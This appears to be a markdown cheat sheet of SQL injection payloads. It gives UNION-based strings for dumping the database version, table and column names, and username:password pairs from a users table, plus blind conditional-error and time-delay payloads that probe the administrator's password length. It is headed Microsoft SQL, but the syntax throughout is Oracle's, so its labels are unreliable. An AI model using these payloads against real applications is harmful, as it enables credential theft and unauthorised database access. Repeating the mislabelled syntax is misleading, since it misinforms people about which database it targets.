

### Microsoft SQL (MS SQL)

### Retreaving Database version

```mysql
SELECT banner FROM v$version
```

```
SELECT version FROM v$instance
```

**UNION SQLi Context**
```
' UNION SELECT NULL,banner FROM v$version -- -
```

```
' UNION SELECT NULL,version FROM v$version
```

> **Note:** In UNION Statement we have to match the number of columns of first select statement so that's why we use one NULL in the payload you can modify that according to your requirements

### String Concatenation

```
'string1' || 'string2'
```

```
SELECT username || ":" || password FROM users;
```

**In a UNION SQLi Context**

```
' UNION SELECT NULL,username || ":" || password FROM Users -- -
```

### Substring

```
SELECT SUBSTR(password,2,1) FROM users 
```

**In UNION SQLi context**
```
' UNION SELECT SUBSTR(password,2,1) FROM users -- -
```

### Comments

```
--comment
```

### Database Contents

**List All Tables**
```
SELECT table_name FROM all_tables;
```

**In a UNION MS SQLi context**

```
' UNION SELECT NULL,table_name FROM all_tables -- -
```

**List All Columns**
```
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

**In UNION MS SQLi**
```
' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' -- -
```

### Conditional Errors

```mysql
SELECT CASE WHEN LENGTH(password) = 3 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'
```

**In UNION MS SQLi**
```
' UNION SELECT NULL,NULL,CASE WHEN LENGTH(password)=FUZZ THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator'
```

### Time delays

```
dbms_pipe.receive_message(('a'),10)
```

### Conditional Time delays

```
SELECT CASE WHEN (LENGTH(password) = 3) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users where username = 'administrator'
```

**In UNION MS SQLi**
```
' UNION SELECT NULL,NULL,CASE WHEN (LENGTH(password) = 3) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users where username = 'administrator'
```
